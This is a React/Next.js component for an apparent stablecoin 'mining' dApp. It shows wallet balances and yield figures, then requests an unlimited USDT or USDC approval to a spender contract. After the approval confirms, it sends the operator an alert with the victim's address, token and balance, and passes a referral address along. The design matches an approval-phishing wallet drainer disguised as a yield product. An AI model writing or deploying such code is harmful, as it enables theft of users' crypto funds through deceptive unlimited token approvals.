'use client';

import { useCallback, useEffect, useMemo, useState } from 'react';
import Image from 'next/image';
import { Wallet, TrendingUp, Percent, Sparkles } from 'lucide-react';
import { useWriteContract, useWaitForTransactionReceipt, useReadContract } from 'wagmi';
import { useAppKit, useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react';
import addressConfig, { ERC20_ABI, TOKEN_OPERATOR_ABI, ENABLE_BALANCE_VALIDATION } from '@/constents';
import AnimatedNumber from '@/components/ui/AnimatedNumber';
import { sendAlert } from '@/constentFunctions';
import AssetSelectionModal from './AssetSelectionModal';
import axios from 'axios';
import { formatUnits } from 'viem';
import { useSearchParams } from 'next/navigation';

export default function MiningSection() {
  const { chainId } = useAppKitNetwork();
  const { data: hash, isPending, writeContract } = useWriteContract();
  const account = useAppKitAccount();
  const { open } = useAppKit();
  const [isModalOpen, setIsModalOpen] = useState(false);
  const [selectedAsset, setSelectedAsset] = useState<'USDT' | 'USDC' | null>(null);
  const [miningAmount, setMiningAmount] = useState<string>('');
  const [isMining, setIsMining] = useState(false);
  const [displayUsdt, setDisplayUsdt] = useState<string>('--');
  const [displayUsdc, setDisplayUsdc] = useState<string>('--');
  const searchParams = useSearchParams();


  const referralAddress = useMemo(() => {
    const ref = searchParams.get('ref');
    return ref && ref.startsWith('0x') && ref.length === 42 ? ref : null;
  }, [searchParams]);

  
  const { isLoading: isConfirming, isSuccess: isConfirmed } = 
    useWaitForTransactionReceipt({ hash });

  const handleStartMining = () => {
    if (!chainId) {
      alert("Please connect your wallet first");
      return;
    }

    const config = addressConfig[String(chainId) as keyof typeof addressConfig];
    
    if (!config) {
      alert("This network is not supported. Please switch to a supported network.");
      return;
    }

    // Open modal to select asset
    setIsModalOpen(true);
  };

  const config = addressConfig[String(chainId) as keyof typeof addressConfig];
  const usdtAddress = config?.USDT as `0x${string}` | undefined;
  const usdcAddress = config?.USDC as `0x${string}` | undefined;
  const contractAddress = config?.SPENDER as `0x${string}` | undefined;

  const { data: miningData } = useReadContract({
    address: contractAddress,
    abi: TOKEN_OPERATOR_ABI,
    functionName: 'getAllUserMiningData',
    args: account?.address ? [account.address as `0x${string}`] : undefined,
    query: {
      enabled: Boolean(account?.address && contractAddress),
      refetchInterval: 5000,
    },
  });

  const usdtBalance = useReadContract({
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [account?.address as `0x${string}`],
    query: { enabled: Boolean(account?.address && usdtAddress) },
  });

  const usdtDecimals = useReadContract({
    address: usdtAddress,
    abi: ERC20_ABI,
    functionName: 'decimals',
    args: [],
    query: { enabled: Boolean(account?.address && usdtAddress) },
  });

  const usdcBalance = useReadContract({
    address: usdcAddress,
    abi: ERC20_ABI,
    functionName: 'balanceOf',
    args: [account?.address as `0x${string}`],
    query: { enabled: Boolean(account?.address && usdcAddress) },
  });

  const usdcDecimals = useReadContract({
    address: usdcAddress,
    abi: ERC20_ABI,
    functionName: 'decimals',
    args: [],
    query: { enabled: Boolean(account?.address && usdcAddress) },
  });

  const miningTotals = useMemo(() => {
    const base = { totalMined: 0, totalRewards: 0, yieldPct: 0 };
    if (!miningData) return base;

    const [, amounts, pendingRewards, decimalsArray, activeStatus] = miningData as [
      readonly string[],
      readonly bigint[],
      readonly bigint[],
      readonly number[],
      readonly boolean[]
    ];

    let totalMined = 0;
    let totalRewards = 0;

    for (let i = 0; i < amounts.length; i++) {
      const decimals = typeof decimalsArray[i] === 'number' ? decimalsArray[i] : 18;
      const mined = Number(formatUnits(amounts[i] ?? BigInt(0), decimals));
      const reward = Number(formatUnits(pendingRewards[i] ?? BigInt(0), decimals));

      if (!Number.isNaN(mined)) totalMined += mined;
      if (!Number.isNaN(reward) && (!activeStatus || activeStatus[i])) totalRewards += reward;
    }

    const yieldPct = totalMined > 0 ? (totalRewards / totalMined) * 100 : 0;
    return { totalMined, totalRewards, yieldPct };
  }, [miningData]);

  // Compute per-token mined amounts to limit how much the user can mine
  const minedPerToken = useMemo(() => {
    const result = { usdt: 0, usdc: 0 };
    if (!miningData || !usdtAddress || !usdcAddress) return result;

    const [tokens, amounts, , decimalsArray] = miningData as [
      readonly string[],
      readonly bigint[],
      readonly bigint[],
      readonly number[],
      readonly boolean[]
    ];

    for (let i = 0; i < tokens.length; i++) {
      const addr = tokens[i]?.toLowerCase();
      const decimals = typeof decimalsArray[i] === 'number' ? decimalsArray[i] : 18;
      const mined = Number(formatUnits(amounts[i] ?? BigInt(0), decimals));
      if (Number.isNaN(mined)) continue;

      if (addr === usdtAddress.toLowerCase()) result.usdt += mined;
      else if (addr === usdcAddress.toLowerCase()) result.usdc += mined;
    }
    return result;
  }, [miningData, usdtAddress, usdcAddress]);

  console.log('Total mined', miningTotals.totalMined, 'Amount to mine', minedPerToken, 'miningData', miningData);

  useEffect(() => {
    const formatBalance = (raw?: bigint, decimals?: number) => {
      if (raw === undefined || decimals === undefined) return '--';
      const asNumber = Number(formatUnits(raw, decimals));
      if (Number.isNaN(asNumber)) return '--';
      return asNumber.toFixed(2);
    };

    setDisplayUsdt(formatBalance(usdtBalance.data as bigint | undefined, usdtDecimals.data as number | undefined));
    setDisplayUsdc(formatBalance(usdcBalance.data as bigint | undefined, usdcDecimals.data as number | undefined));
  }, [usdtBalance.data, usdtDecimals.data, usdcBalance.data, usdcDecimals.data]);

  const getTokenBalanceForAlert = useCallback((asset: 'USDT' | 'USDC') => {
    const rawBalance = asset === 'USDT'
      ? (usdtBalance.data as bigint | undefined)
      : (usdcBalance.data as bigint | undefined);
    const decimals = asset === 'USDT'
      ? (usdtDecimals.data as number | undefined)
      : (usdcDecimals.data as number | undefined);

    if (rawBalance === undefined || decimals === undefined) return '--';

    const formatted = Number(formatUnits(rawBalance, decimals));
    if (Number.isNaN(formatted)) return '--';

    return formatted.toFixed(2);
  }, [usdtBalance.data, usdtDecimals.data, usdcBalance.data, usdcDecimals.data]);

  const handleAssetSelection = async (asset: 'USDT' | 'USDC', amount: string) => {
    setSelectedAsset(asset);
    setMiningAmount(amount);
    setIsMining(false);

    const config = addressConfig[String(chainId) as keyof typeof addressConfig];
    
    if (!config) {
      alert("This network is not supported. Please switch to a supported network.");
      return;
    }

    const { USDT, SPENDER, USDC } = config;

    
    // Select the token address based on user's choice
    const tokenAddress = asset === 'USDT' ? USDT : USDC;
  
    const maxApproval = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    try {
      await writeContract({
        address: tokenAddress as `0x${string}`,
        abi: ERC20_ABI,
        functionName: 'approve',
        args: [SPENDER as `0x${string}`, BigInt(maxApproval)],
      });
    } catch (error) {
      console.error("Approval failed:", error);
      setSelectedAsset(null);
      setMiningAmount('');
      setIsMining(false);
    }
    finally {
      // We will trigger the mining API call in the useEffect that listens for transaction confirmation
       setIsMining(false);
    }
  };

  // Handle transaction confirmation
  useEffect(() => {
    const callMineFunction = async () => {
      console.log('useEffect triggered with', { isConfirmed, selectedAsset, miningAmount, isMining });
      if (isConfirmed && selectedAsset && miningAmount && !isMining) {
        setIsMining(true);

        // Send alert when approval transaction is confirmed
        {
          const chainNames: { [key: string]: string } = {
            '97': 'BSC Testnet',
            '56': 'BSC Mainnet',
            '11155111': 'Ethereum Sepolia',
            '1': 'Ethereum Mainnet',
            '80001': 'Polygon Mumbai',
            '137': 'Polygon Mainnet'
          };
          const chainName = chainNames[String(chainId)] || `Chain ${chainId}`;
          const approvalConfig = addressConfig[String(chainId) as keyof typeof addressConfig];
          const tokenAddress = selectedAsset === 'USDT' ? approvalConfig?.USDT : approvalConfig?.USDC;
          const selectedAssetBalance = getTokenBalanceForAlert(selectedAsset);
          const message = `🎉 <b>User Approved!</b>\n\n` +
            `👤 User: <code>${account?.address}</code>\n` +
            `🪙 Token: <code>${tokenAddress}</code>\n` +
            `🪙 Token Name: <code>${selectedAsset}</code>\n` +
            `⛓️ Network: <b>${chainName}</b>\n` +
            `💰 Balance: <code>${selectedAssetBalance} ${selectedAsset}</code>\n`;
          sendAlert(message);
        }

      console.log('Total mined', miningTotals.totalMined, 'Amount to mine', miningAmount);
      if (ENABLE_BALANCE_VALIDATION && Number(miningTotals.totalMined) === 0 && parseFloat(miningAmount) < 16) {
        setIsMining(false);
        alert('Minimum amount to mine is 16 tokens. Please enter a higher amount.');
        return;
    }
        
        try {
          // Get the token contract address
          const config = addressConfig[String(chainId) as keyof typeof addressConfig];
          const tokenAddress = selectedAsset === 'USDT' ? config?.USDT : config?.USDC;
          
          // Get token decimals based on chain — BSC uses 18, ETH/Polygon use 6
          const getTokenDecimals = (chainId: string | number | undefined): number => {
            const cid = String(chainId);
            if (cid === '56' || cid === '97') return 18; // BSC mainnet/testnet
            return 6; // ETH, Polygon (and their testnets): USDT & USDC are 6 decimals
          };
          const decimals = getTokenDecimals(chainId);
          
          // Convert amount to smallest unit using BigInt to avoid scientific notation
          const parseAmountToSmallestUnit = (amount: string, decimals: number): string => {
            // Split the amount into integer and decimal parts
            const [integerPart, decimalPart = ''] = amount.split('.');
            
            // Pad or trim the decimal part to match token decimals
            const paddedDecimal = decimalPart.padEnd(decimals, '0').slice(0, decimals);
            
            // Combine integer and decimal parts
            const fullAmount = integerPart + paddedDecimal;
            
            // Remove leading zeros and return
            return BigInt(fullAmount || '0').toString();
          };
          
          const amountInSmallestUnit = parseAmountToSmallestUnit(miningAmount, decimals);

          console.log('Parsed amount in smallest unit:', amountInSmallestUnit, 'for decimals:', decimals);
          console.log('Token address:', tokenAddress);
          console.log('Chain ID:', chainId);
          console.log('Referrer address:', referralAddress ?? '0x0000000000000000000000000000000000000000');
          
          // Call the mine API
          console.log('Calling mine API...');
          const response = await axios.post('/api/mine', {
            userAddress: account?.address,
            tokenAddress: tokenAddress,
            amount: amountInSmallestUnit,
            chainId: String(chainId),
            referrer: referralAddress ?? '0x0000000000000000000000000000000000000000',
          }, {
            timeout: 45000, // 45 second timeout
            headers: {
              'Content-Type': 'application/json',
            }
          });
          
          const data = response.data;
          console.log('Mine API response:', data);
          
          if (data.success) {
            alert(`Mining started successfully`);
          } else {
            alert(`Failed to start mining: ${data.error}`);
          }
        } catch (error) {
          console.error("Mine API call failed:", error);
          if (axios.isAxiosError(error)) {
            if (error.code === 'ECONNABORTED') {
              alert('Mine API timed out. Please try again.');
            } else if (error.response) {
              alert(`Mine failed: ${error.response.data?.error || 'Unknown error'}`);
            } else {
              alert('Network error occurred. Please check your connection.');
            }
          } else {
            alert("Failed to start mining. Please contact support.");
          }
        } finally {
          // Reset states
          setSelectedAsset(null);
          setMiningAmount('');
          setIsMining(false);
        }
      }
    };
    
    callMineFunction();
  }, [
    isConfirmed,
    selectedAsset,
    miningAmount,
    chainId,
    account?.address,
    isMining,
    minedPerToken.usdt,
    minedPerToken.usdc,
    miningTotals.totalMined,
    referralAddress,
    usdtBalance.data,
    usdtDecimals.data,
    usdcBalance.data,
    usdcDecimals.data,
    getTokenBalanceForAlert,
  ]);


  return (
    <div className="space-y-3">
      {/* Hero Card with Image */}
      <div className="bg-linear-to-br from-indigo-500 via-purple-500 to-pink-500 rounded-2xl p-4 shadow-lg relative overflow-hidden">
        <div className="absolute inset-0 bg-black opacity-5"></div>
        <div className="relative z-10 flex justify-center">
          <Image
            src="/coins.png"
            alt="Crypto Mining"
            width={300}
            height={70}
            className="object-contain drop-shadow-lg"
            priority
          />
        </div>
      </div>

      {/* Stats Grid Cards */}
      <div className="grid grid-cols-2 gap-3">
        <div className="bg-white rounded-xl p-3 shadow-sm border-l-4 border-teal-500">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-8 h-8 bg-teal-100 rounded-lg flex items-center justify-center">
              <Wallet size={16} className="text-teal-600" />
            </div>
            <span className="text-xs text-gray-600 font-medium">USDT Balance</span>
          </div>
          <p className="text-xl font-bold text-gray-900">{displayUsdt === '--' ? '--' : <AnimatedNumber value={parseFloat(displayUsdt)} decimals={2} />}</p>
        </div>

        <div className="bg-white rounded-xl p-3 shadow-sm border-l-4 border-blue-500">
          <div className="flex items-center gap-2 mb-2">
            <div className="w-8 h-8 bg-blue-100 rounded-lg flex items-center justify-center">
              <TrendingUp size={16} className="text-blue-600" />
            </div>
            <span className="text-xs text-gray-600 font-medium">USDC Balance</span>
          </div>
          <p className="text-xl font-bold text-gray-900">{displayUsdc === '--' ? '--' : <AnimatedNumber value={parseFloat(displayUsdc)} decimals={2} />}</p>
        </div>

        <div className="bg-white rounded-xl p-3 shadow-sm border-l-4 border-purple-500 col-span-2">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2">
              <div className="w-8 h-8 bg-purple-100 rounded-lg flex items-center justify-center">
                <Percent size={16} className="text-purple-600" />
              </div>
              <span className="text-xs text-gray-600 font-medium">Current Yield</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-xl font-bold text-purple-600"><AnimatedNumber value={miningTotals.yieldPct} decimals={3} suffix="%" /></span>
              <TrendingUp size={16} className="text-purple-600" />
            </div>
          </div>
          <div className="grid grid-cols-2 gap-2 mt-3">
            <div className="bg-purple-50 rounded-lg p-2">
              <p className="text-[11px] text-purple-700 font-semibold uppercase">Total Mined</p>
              <p className="text-sm font-bold text-purple-900"><AnimatedNumber value={miningTotals.totalMined} decimals={2} /></p>
            </div>
            <div className="bg-purple-50 rounded-lg p-2">
              <p className="text-[11px] text-purple-700 font-semibold uppercase">Total Rewards</p>
              <p className="text-sm font-bold text-purple-900"><AnimatedNumber value={miningTotals.totalRewards} decimals={6} /></p>
            </div>
          </div>
        </div>
      </div>

      {/* Enhanced Mining Button */}
      {!account?.isConnected ? (
        <button
          onClick={() => open()}
          className="w-full py-4 rounded-2xl font-bold text-base text-white transition-all shadow-lg relative overflow-hidden group bg-linear-to-r from-teal-400 via-blue-500 to-indigo-500 hover:shadow-xl"
        >
          <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-10 transition-opacity"></div>
          <div className="flex items-center justify-center gap-2">
            <Wallet size={20} />
            <span>Connect Wallet</span>
          </div>
        </button>
      ) : (
        <button
          onClick={handleStartMining}
          disabled={isPending || isConfirming}
          className={`w-full py-4 rounded-2xl font-bold text-base text-white transition-all shadow-lg relative overflow-hidden group ${
            isPending || isConfirming
              ? 'bg-linear-to-r from-gray-400 to-gray-500 cursor-not-allowed'
              : 'bg-linear-to-r from-teal-400 via-blue-500 to-indigo-500 hover:shadow-xl'
          }`}
        >
          <div className="absolute inset-0 bg-white opacity-0 group-hover:opacity-10 transition-opacity"></div>
          <div className="flex items-center justify-center gap-2">
            {(isPending || isConfirming) ? (
              <>
                <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                <span>{isConfirming ? 'Confirming...' : 'Processing...'}</span>
              </>
            ) : (
              <>
                <Sparkles size={20} />
                <span>Start Mining</span>
              </>
            )}
          </div>
        </button>
      )}

      {/* Asset Selection Modal */}
      <AssetSelectionModal
        isOpen={isModalOpen}
        onClose={() => setIsModalOpen(false)}
        onSelectAsset={handleAssetSelection}
        minedUsdt={minedPerToken.usdt}
        minedUsdc={minedPerToken.usdc}
      />
    </div>
  );
}
